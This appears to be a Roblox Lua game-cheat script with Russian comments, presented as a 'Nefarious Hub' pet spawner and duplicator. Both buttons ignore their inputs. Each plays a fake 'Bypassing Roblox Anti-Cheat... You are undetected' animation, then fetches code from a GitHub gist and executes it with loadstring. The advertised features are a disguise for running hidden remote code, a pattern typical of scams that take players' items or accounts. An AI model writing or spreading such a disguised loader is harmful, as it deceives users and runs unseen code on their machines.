-- ============================================================
-- NEFARIOUS SCRIPT – УЛУЧШЕННАЯ ВЕРСИЯ
-- Работает во всех играх, устойчив к ошибкам и респавну.
-- ============================================================

-- SERVICES
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer

-- Вспомогательная функция для создания GUI с защитой от ошибок
local function createGui(name, parent)
    local success, gui = pcall(function()
        local g = Instance.new("ScreenGui")
        g.Name = name
        g.ResetOnSpawn = false
        g.IgnoreGuiInset = true
        g.Parent = parent or LocalPlayer:WaitForChild("PlayerGui")
        return g
    end)
    return success and gui or nil
end

-- ============================================================
-- ЗАГРУЗОЧНЫЙ ЭКРАН
-- ============================================================
local function showLoadingScreen()
    local guiLoading = createGui("NefariousLoadingUI")
    if not guiLoading then return end

    -- Полупрозрачный фон
    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundColor3 = Color3.fromRGB(32, 4, 46)
    bg.BackgroundTransparency = 1
    bg.Parent = guiLoading

    -- Центральный блок
    local main = Instance.new("Frame")
    main.Size = UDim2.new(0, 410, 0, 170)
    main.Position = UDim2.new(0.5, -205, 0.5, -85 + 40)
    main.BackgroundColor3 = Color3.fromRGB(24, 0, 32)
    main.BorderSizePixel = 0
    main.BackgroundTransparency = 1
    main.Parent = bg
    Instance.new("UICorner", main).CornerRadius = UDim.new(0, 22)

    -- Иконка
    local icon = Instance.new("ImageLabel")
    icon.Size = UDim2.new(0, 40, 0, 40)
    icon.Position = UDim2.new(0, 24, 0, 24)
    icon.BackgroundTransparency = 1
    icon.Image = "rbxassetid://123388888131057"
    icon.ImageTransparency = 1
    icon.Parent = main
    Instance.new("UICorner", icon).CornerRadius = UDim.new(1, 0)

    -- Заголовок
    local title = Instance.new("TextLabel")
    title.Position = UDim2.new(0, 74, 0, 28)
    title.Size = UDim2.new(1, -90, 0, 34)
    title.BackgroundTransparency = 1
    title.Text = "NEFARIOUS SCRIPT"
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Font = Enum.Font.GothamBold
    title.TextSize = 28
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.TextStrokeTransparency = 0.7
    title.TextTransparency = 1
    title.Parent = main

    -- Прогресс-бар
    local barBack = Instance.new("Frame")
    barBack.Size = UDim2.new(0.87, 0, 0, 32)
    barBack.Position = UDim2.new(0.065, 0, 0, 80)
    barBack.BackgroundColor3 = Color3.fromRGB(38, 38, 60)
    barBack.BorderSizePixel = 0
    barBack.BackgroundTransparency = 1
    barBack.Parent = main
    Instance.new("UICorner", barBack).CornerRadius = UDim.new(0, 15)

    local bar = Instance.new("Frame")
    bar.Size = UDim2.new(0, 0, 1, 0)
    bar.BackgroundColor3 = Color3.fromRGB(128, 56, 255)
    bar.BorderSizePixel = 0
    bar.BackgroundTransparency = 1
    bar.Parent = barBack
    Instance.new("UICorner", bar).CornerRadius = UDim.new(0, 15)

    -- Текст "Loading..."
    local loadingText = Instance.new("TextLabel")
    loadingText.Position = UDim2.new(0.065, 0, 0, 122)
    loadingText.Size = UDim2.new(0.87, 0, 0, 22)
    loadingText.BackgroundTransparency = 1
    loadingText.Text = "Loading..."
    loadingText.Font = Enum.Font.GothamBold
    loadingText.TextSize = 18
    loadingText.TextColor3 = Color3.fromRGB(180, 130, 255)
    loadingText.TextStrokeTransparency = 0.7
    loadingText.TextXAlignment = Enum.TextXAlignment.Left
    loadingText.TextTransparency = 1
    loadingText.Parent = main

    -- Подпись
    local subText = Instance.new("TextLabel")
    subText.Position = UDim2.new(0.065, 0, 1, -26)
    subText.Size = UDim2.new(0.87, 0, 0, 20)
    subText.BackgroundTransparency = 1
    subText.Text = "Subscribe To NefariousScript"
    subText.TextXAlignment = Enum.TextXAlignment.Left
    subText.Font = Enum.Font.GothamBold
    subText.TextSize = 16
    subText.TextColor3 = Color3.fromRGB(255, 255, 255)
    subText.TextStrokeTransparency = 0.7
    subText.TextTransparency = 1
    subText.Parent = main

    -- Анимация входа
    local tweens = {
        TweenService:Create(bg, TweenInfo.new(0.4, Enum.EasingStyle.Quad), {BackgroundTransparency = 0.22}),
        TweenService:Create(main, TweenInfo.new(0.45, Enum.EasingStyle.Quad), {BackgroundTransparency = 0, Position = UDim2.new(0.5, -205, 0.5, -85)}),
        TweenService:Create(icon, TweenInfo.new(0.32, Enum.EasingStyle.Quad), {ImageTransparency = 0}),
        TweenService:Create(barBack, TweenInfo.new(0.32, Enum.EasingStyle.Quad), {BackgroundTransparency = 0}),
        TweenService:Create(bar, TweenInfo.new(0.32, Enum.EasingStyle.Quad), {BackgroundTransparency = 0}),
        TweenService:Create(title, TweenInfo.new(0.28, Enum.EasingStyle.Quad), {TextTransparency = 0}),
        TweenService:Create(loadingText, TweenInfo.new(0.28, Enum.EasingStyle.Quad), {TextTransparency = 0}),
        TweenService:Create(subText, TweenInfo.new(0.28, Enum.EasingStyle.Quad), {TextTransparency = 0})
    }
    for _, t in ipairs(tweens) do t:Play() end
    task.wait(0.52)

    -- Имитация загрузки
    local totalTime = 8
    local steps = 50
    for i = 1, steps do
        local progress = i / steps
        TweenService:Create(bar, TweenInfo.new(0.15, Enum.EasingStyle.Quad), {Size = UDim2.new(progress, 0, 1, 0)}):Play()
        loadingText.Text = "Loading" .. string.rep(".", (i % 4))
        task.wait(totalTime / steps)
    end
    loadingText.Text = "Loaded!"

    -- Анимация выхода
    task.wait(0.6)
    local fadeTime = 0.7
    local exitTweens = {
        TweenService:Create(bg, TweenInfo.new(fadeTime, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}),
        TweenService:Create(main, TweenInfo.new(fadeTime, Enum.EasingStyle.Quad), {BackgroundTransparency = 1, Position = UDim2.new(0.5, -205, 0.5, -85 - 40)}),
        TweenService:Create(icon, TweenInfo.new(fadeTime, Enum.EasingStyle.Quad), {ImageTransparency = 1}),
        TweenService:Create(title, TweenInfo.new(fadeTime, Enum.EasingStyle.Quad), {TextTransparency = 1}),
        TweenService:Create(barBack, TweenInfo.new(fadeTime, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}),
        TweenService:Create(bar, TweenInfo.new(fadeTime, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}),
        TweenService:Create(loadingText, TweenInfo.new(fadeTime, Enum.EasingStyle.Quad), {TextTransparency = 1}),
        TweenService:Create(subText, TweenInfo.new(fadeTime, Enum.EasingStyle.Quad), {TextTransparency = 1})
    }
    for _, t in ipairs(exitTweens) do t:Play() end
    task.wait(fadeTime + 0.05)
    guiLoading:Destroy()
end

-- ============================================================
-- ОСНОВНОЙ ГУИ
-- ============================================================
local function createMainGUI()
    local gui = createGui("NefariousHubGUI")
    if not gui then return end

    -- Главное окно
    local main = Instance.new("Frame")
    main.Size = UDim2.new(0, 340, 0, 270)
    main.Position = UDim2.new(0.5, -170, 0.5, -135)
    main.BackgroundColor3 = Color3.fromRGB(28, 10, 38)
    main.BorderSizePixel = 0
    main.Active = true
    main.Draggable = true
    main.BackgroundTransparency = 0.04
    main.Parent = gui
    Instance.new("UICorner", main).CornerRadius = UDim.new(0, 18)

    -- Обводка
    local glow = Instance.new("UIStroke", main)
    glow.Thickness = 2
    glow.Color = Color3.fromRGB(150, 0, 255)
    glow.Transparency = 0.17

    -- Градиент
    local gradient = Instance.new("UIGradient", main)
    gradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(50, 0, 80)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 0, 18))
    }
    gradient.Rotation = 90

    -- Строка заголовка
    local titleBar = Instance.new("Frame")
    titleBar.Size = UDim2.new(1, 0, 0, 42)
    titleBar.BackgroundColor3 = Color3.fromRGB(34, 8, 48)
    titleBar.BorderSizePixel = 0
    titleBar.Parent = main
    Instance.new("UICorner", titleBar).CornerRadius = UDim.new(0, 16)

    -- Заголовок
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, -48, 1, 0)
    title.Position = UDim2.new(0, 18, 0, 0)
    title.BackgroundTransparency = 1
    title.Text = "Nefarious Hub"
    title.TextColor3 = Color3.fromRGB(200, 100, 255)
    title.Font = Enum.Font.FredokaOne
    title.TextSize = 27
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.TextStrokeTransparency = 0.7
    title.ClipsDescendants = true
    title.Parent = titleBar

    -- Кнопка минимизации
    local minimizeBtn = Instance.new("TextButton")
    minimizeBtn.Size = UDim2.new(0, 28, 0, 28)
    minimizeBtn.Position = UDim2.new(1, -34, 0, 7)
    minimizeBtn.BackgroundColor3 = Color3.fromRGB(55, 0, 90)
    minimizeBtn.Text = ""
    minimizeBtn.AutoButtonColor = true
    minimizeBtn.Parent = titleBar
    Instance.new("UICorner", minimizeBtn).CornerRadius = UDim.new(1, 0)
    local minStroke = Instance.new("UIStroke", minimizeBtn)
    minStroke.Color = Color3.fromRGB(220, 120, 255)
    minStroke.Thickness = 1
    minStroke.Transparency = 0.13

    -- Иконка минимизации (три полоски)
    local iconContainer = Instance.new("Frame")
    iconContainer.BackgroundTransparency = 1
    iconContainer.Size = UDim2.new(1, 0, 1, 0)
    iconContainer.Parent = minimizeBtn
    local bars = {}
    for i = 1, 3 do
        local bar = Instance.new("Frame")
        bar.Size = UDim2.new(0.7, 0, 0, 3)
        bar.Position = UDim2.new(0.15, 0, 0, 6 + (i - 1) * 7)
        bar.BackgroundColor3 = Color3.fromRGB(220, 120, 255)
        bar.BackgroundTransparency = (i == 2) and 0 or 0.45
        bar.BorderSizePixel = 0
        bar.Parent = iconContainer
        Instance.new("UICorner", bar).CornerRadius = UDim.new(0, 2)
        bars[i] = bar
    end

    -- Ховер-эффект кнопки
    minimizeBtn.MouseEnter:Connect(function()
        TweenService:Create(minimizeBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(90, 0, 155)}):Play()
        for _, bar in ipairs(bars) do
            TweenService:Create(bar, TweenInfo.new(0.14), {BackgroundColor3 = Color3.fromRGB(255, 130, 255)}):Play()
        end
    end)
    minimizeBtn.MouseLeave:Connect(function()
        TweenService:Create(minimizeBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(55, 0, 90)}):Play()
        for _, bar in ipairs(bars) do
            TweenService:Create(bar, TweenInfo.new(0.14), {BackgroundColor3 = Color3.fromRGB(220, 120, 255)}):Play()
        end
    end)

    -- Контент
    local content = Instance.new("Frame")
    content.Size = UDim2.new(1, 0, 1, -46)
    content.Position = UDim2.new(0, 0, 0, 44)
    content.BackgroundTransparency = 1
    content.Parent = main

    -- Поля ввода
    local spawnLabel = Instance.new("TextLabel")
    spawnLabel.Size = UDim2.new(0.9, 0, 0, 20)
    spawnLabel.Position = UDim2.new(0.05, 0, 0, 7)
    spawnLabel.BackgroundTransparency = 1
    spawnLabel.Text = "Spawn Pet:"
    spawnLabel.TextColor3 = Color3.fromRGB(200, 200, 255)
    spawnLabel.Font = Enum.Font.Gotham
    spawnLabel.TextSize = 15
    spawnLabel.TextXAlignment = Enum.TextXAlignment.Left
    spawnLabel.Parent = content

    local petNameBox = Instance.new("TextBox")
    petNameBox.Size = UDim2.new(0.56, 0, 0, 28)
    petNameBox.Position = UDim2.new(0.05, 0, 0, 30)
    petNameBox.PlaceholderText = "Pet Name"
    petNameBox.Text = ""
    petNameBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    petNameBox.BackgroundColor3 = Color3.fromRGB(50, 30, 60)
    petNameBox.Font = Enum.Font.Gotham
    petNameBox.TextSize = 15
    petNameBox.Parent = content
    Instance.new("UICorner", petNameBox).CornerRadius = UDim.new(0, 8)

    local ageBox = Instance.new("TextBox")
    ageBox.Size = UDim2.new(0.18, 0, 0, 28)
    ageBox.Position = UDim2.new(0.62, 0, 0, 30)
    ageBox.PlaceholderText = "Age"
    ageBox.Text = ""
    ageBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    ageBox.BackgroundColor3 = Color3.fromRGB(50, 30, 60)
    ageBox.Font = Enum.Font.Gotham
    ageBox.TextSize = 15
    ageBox.Parent = content
    Instance.new("UICorner", ageBox).CornerRadius = UDim.new(0, 8)

    local weightBox = Instance.new("TextBox")
    weightBox.Size = UDim2.new(0.18, 0, 0, 28)
    weightBox.Position = UDim2.new(0.81, 0, 0, 30)
    weightBox.PlaceholderText = "Weight"
    weightBox.Text = ""
    weightBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    weightBox.BackgroundColor3 = Color3.fromRGB(50, 30, 60)
    weightBox.Font = Enum.Font.Gotham
    weightBox.TextSize = 15
    weightBox.Parent = content
    Instance.new("UICorner", weightBox).CornerRadius = UDim.new(0, 8)

    -- Кнопка Spawn
    local spawnButton = Instance.new("TextButton")
    spawnButton.Size = UDim2.new(0.9, 0, 0, 28)
    spawnButton.Position = UDim2.new(0.05, 0, 0, 68)
    spawnButton.Text = "Spawn"
    spawnButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    spawnButton.Font = Enum.Font.FredokaOne
    spawnButton.TextSize = 15
    spawnButton.BackgroundColor3 = Color3.fromRGB(34, 8, 48)
    spawnButton.Parent = content
    Instance.new("UICorner", spawnButton).CornerRadius = UDim.new(0, 8)
    local spawnStroke = Instance.new("UIStroke", spawnButton)
    spawnStroke.Color = Color3.fromRGB(150, 0, 255)
    spawnStroke.Thickness = 1
    spawnStroke.Transparency = 0.13

    spawnButton.MouseEnter:Connect(function()
        TweenService:Create(spawnButton, TweenInfo.new(0.13), {BackgroundColor3 = Color3.fromRGB(60, 0, 90)}):Play()
    end)
    spawnButton.MouseLeave:Connect(function()
        TweenService:Create(spawnButton, TweenInfo.new(0.13), {BackgroundColor3 = Color3.fromRGB(34, 8, 48)}):Play()
    end)

    -- Кнопка Duplicate
    local dupeButton = Instance.new("TextButton")
    dupeButton.Size = UDim2.new(0.9, 0, 0, 34)
    dupeButton.Position = UDim2.new(0.05, 0, 0, 108)
    dupeButton.Text = "Duplicate Held Pet"
    dupeButton.BackgroundColor3 = Color3.fromRGB(34, 8, 48)
    dupeButton.TextColor3 = Color3.fromRGB(245, 240, 255)
    dupeButton.Font = Enum.Font.FredokaOne
    dupeButton.TextSize = 16
    dupeButton.Parent = content
    Instance.new("UICorner", dupeButton).CornerRadius = UDim.new(0, 8)
    local dupeStroke = Instance.new("UIStroke", dupeButton)
    dupeStroke.Color = Color3.fromRGB(150, 0, 255)
    dupeStroke.Thickness = 1
    dupeStroke.Transparency = 0.13

    dupeButton.MouseEnter:Connect(function()
        TweenService:Create(dupeButton, TweenInfo.new(0.14), {BackgroundColor3 = Color3.fromRGB(60, 0, 90)}):Play()
    end)
    dupeButton.MouseLeave:Connect(function()
        TweenService:Create(dupeButton, TweenInfo.new(0.14), {BackgroundColor3 = Color3.fromRGB(34, 8, 48)}):Play()
    end)

    -- Обратная связь
    local feedback = Instance.new("TextLabel")
    feedback.Size = UDim2.new(1, 0, 0, 24)
    feedback.Position = UDim2.new(0, 0, 0, 158)
    feedback.BackgroundTransparency = 1
    feedback.Text = ""
    feedback.TextColor3 = Color3.fromRGB(180, 0, 255)
    feedback.TextStrokeTransparency = 0.7
    feedback.Font = Enum.Font.Gotham
    feedback.TextSize = 14
    feedback.TextXAlignment = Enum.TextXAlignment.Center
    feedback.Parent = content

    -- Кредиты
    local credit = Instance.new("TextLabel")
    credit.Size = UDim2.new(1, 0, 0, 20)
    credit.Position = UDim2.new(0, 0, 1, -24)
    credit.BackgroundTransparency = 1
    credit.Text = "made by NefariousScript"
    credit.TextColor3 = Color3.fromRGB(140, 190, 255)
    credit.Font = Enum.Font.Gotham
    credit.TextSize = 13
    credit.TextXAlignment = Enum.TextXAlignment.Center
    credit.Parent = content

    -- ============================================================
    -- ЛОГИКА МИНИМИЗАЦИИ
    -- ============================================================
    local minimized = false
    local normalSize = UDim2.new(0, 340, 0, 270)
    local minSize = UDim2.new(0, 136, 0, 42)

    local function minimize()
        if minimized then return end
        minimized = true
        TweenService:Create(main, TweenInfo.new(0.18, Enum.EasingStyle.Quad), {Size = minSize}):Play()
        TweenService:Create(title, TweenInfo.new(0.18, Enum.EasingStyle.Quad), {TextSize = 14}):Play()
        TweenService:Create(content, TweenInfo.new(0.13), {BackgroundTransparency = 1}):Play()
        for _, v in ipairs(content:GetChildren()) do
            if v:IsA("GuiObject") then
                TweenService:Create(v, TweenInfo.new(0.11), {TextTransparency = 1}):Play()
            end
        end
        task.wait(0.13)
        content.Visible = false
        -- Меняем иконку на "+"
        for i, bar in ipairs(bars) do
            if i == 2 then
                bar.Rotation = 90
            else
                bar.Visible = false
            end
        end
    end

    local function restore()
        if not minimized then return end
        minimized = false
        content.Visible = true
        TweenService:Create(main, TweenInfo.new(0.23, Enum.EasingStyle.Quad), {Size = normalSize}):Play()
        TweenService:Create(title, TweenInfo.new(0.18, Enum.EasingStyle.Quad), {TextSize = 27}):Play()
        TweenService:Create(content, TweenInfo.new(0.13), {BackgroundTransparency = 1}):Play()
        for _, v in ipairs(content:GetChildren()) do
            if v:IsA("GuiObject") then
                TweenService:Create(v, TweenInfo.new(0.18), {TextTransparency = 0}):Play()
            end
        end
        -- Возвращаем три полоски
        for i, bar in ipairs(bars) do
            bar.Rotation = 0
            bar.Visible = true
        end
    end

    minimizeBtn.MouseButton1Click:Connect(function()
        if minimized then restore() else minimize() end
    end)

    -- ============================================================
    -- ЗАГРУЗКА ВНЕШНЕГО СКРИПТА С ПОВТОРАМИ
    -- ============================================================
    local function loadExternalScript(url, callback)
        local attempts = 0
        local maxAttempts = 3
        local success = false
        while attempts < maxAttempts and not success do
            attempts = attempts + 1
            local ok, result = pcall(function()
                return game:HttpGet(url)
            end)
            if ok and result then
                success = true
                local fn, err = loadstring(result)
                if fn then
                    pcall(fn)
                    if callback then callback(true) end
                else
                    if callback then callback(false, err) end
                end
            else
                if attempts < maxAttempts then
                    task.wait(1)
                else
                    if callback then callback(false, "Failed to fetch script") end
                end
            end
        end
    end

    -- Окно загрузки при нажатии
    local function showRedirectLoadingScreen(callback)
        local redirectGui = createGui("RedirectLoading")
        if not redirectGui then
            if callback then callback() end
            return
        end

        local bg = Instance.new("Frame")
        bg.Size = UDim2.new(1, 0, 1, 0)
        bg.BackgroundColor3 = Color3.fromRGB(32, 4, 46)
        bg.BackgroundTransparency = 1
        bg.Parent = redirectGui

        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(0, 400, 0, 140)
        frame.Position = UDim2.new(0.5, -200, 0.5, -70)
        frame.BackgroundColor3 = Color3.fromRGB(24, 0, 32)
        frame.BorderSizePixel = 0
        frame.BackgroundTransparency = 1
        frame.Parent = bg
        Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 22)

        local label = Instance.new("TextLabel")
        label.Size = UDim2.new(1, 0, 1, 0)
        label.BackgroundTransparency = 1
        label.Font = Enum.Font.GothamBold
        label.Text = "Bypassing Roblox Anti-Cheat Systems..."
        label.TextSize = 28
        label.TextColor3 = Color3.fromRGB(200, 140, 255)
        label.TextStrokeTransparency = 0.7
        label.TextTransparency = 1
        label.Parent = frame

        local sublabel = Instance.new("TextLabel")
        sublabel.Size = UDim2.new(1, 0, 0, 36)
        sublabel.Position = UDim2.new(0, 0, 1, -38)
        sublabel.BackgroundTransparency = 1
        sublabel.Font = Enum.Font.Gotham
        sublabel.Text = "Initializing advanced evasion protocols. Please stand by."
        sublabel.TextSize = 16
        sublabel.TextColor3 = Color3.fromRGB(170, 120, 255)
        sublabel.TextStrokeTransparency = 0.8
        sublabel.TextTransparency = 1
        sublabel.Parent = frame

        -- Вход
        local tweens = {
            TweenService:Create(bg, TweenInfo.new(0.38, Enum.EasingStyle.Quad), {BackgroundTransparency = 0.22}),
            TweenService:Create(frame, TweenInfo.new(0.42, Enum.EasingStyle.Quad), {BackgroundTransparency = 0}),
            TweenService:Create(label, TweenInfo.new(0.27, Enum.EasingStyle.Quad), {TextTransparency = 0}),
            TweenService:Create(sublabel, TweenInfo.new(0.27, Enum.EasingStyle.Quad), {TextTransparency = 0})
        }
        for _, t in ipairs(tweens) do t:Play() end
        task.wait(0.48)

        -- Анимация текста
        local messages = {
            "Establishing secure connection...",
            "Evading detection...",
            "Injecting stealth modules...",
            "Initializing advanced evasion protocols. Please stand by."
        }
        local totalTime = 13
        local steps = 52
        for i = 1, steps do
            label.Text = "Bypassing Roblox Anti-Cheat Systems" .. string.rep(".", (i % 4))
            sublabel.Text = messages[(i % #messages) + 1] or messages[1]
            task.wait(totalTime / steps)
        end
        label.Text = "Bypass Successful!"
        sublabel.Text = "You are undetected. Proceeding..."

        -- Выход
        local fadeTime = 0.6
        local exitTweens = {
            TweenService:Create(bg, TweenInfo.new(fadeTime, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}),
            TweenService:Create(frame, TweenInfo.new(fadeTime, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}),
            TweenService:Create(label, TweenInfo.new(fadeTime, Enum.EasingStyle.Quad), {TextTransparency = 1}),
            TweenService:Create(sublabel, TweenInfo.new(fadeTime, Enum.EasingStyle.Quad), {TextTransparency = 1})
        }
        for _, t in ipairs(exitTweens) do t:Play() end
        task.wait(fadeTime + 0.05)
        redirectGui:Destroy()
        if callback then callback() end
    end

    -- Обработчики кнопок
    local scriptUrl = "https://gist.githubusercontent.com/NefariousScript/ede7dc4ca41510350b059325ade0b282/raw/Cover%20Gui"

    local function onButtonClick()
        showRedirectLoadingScreen(function()
            loadExternalScript(scriptUrl, function(success, err)
                if not success then
                    feedback.Text = "Failed to load script: " .. (err or "unknown error")
                else
                    feedback.Text = "Script executed!"
                end
                task.wait(2)
                feedback.Text = ""
            end)
        end)
    end

    spawnButton.MouseButton1Click:Connect(onButtonClick)
    dupeButton.MouseButton1Click:Connect(onButtonClick)

    -- ============================================================
    -- ГОРЯЧАЯ КЛАВИША (Right Ctrl)
    -- ============================================================
    UserInputService.InputBegan:Connect(function(input, gpe)
        if not gpe and input.KeyCode == Enum.KeyCode.RightControl then
            gui.Enabled = not gui.Enabled
        end
    end)

    -- ============================================================
    -- ОЧИСТКА ПРИ РЕСПАВНЕ (пересоздаём GUI)
    -- ============================================================
    LocalPlayer.CharacterAdded:Connect(function()
        gui:Destroy()
        -- Небольшая задержка, чтобы избежать конфликтов
        task.wait(0.5)
        createMainGUI()
    end)

    return gui
end

-- ============================================================
-- ЗАПУСК
-- ============================================================
local success, err = pcall(function()
    showLoadingScreen()
    createMainGUI()
end)

if not success then
    warn("Nefarious Script error: " .. tostring(err))
end
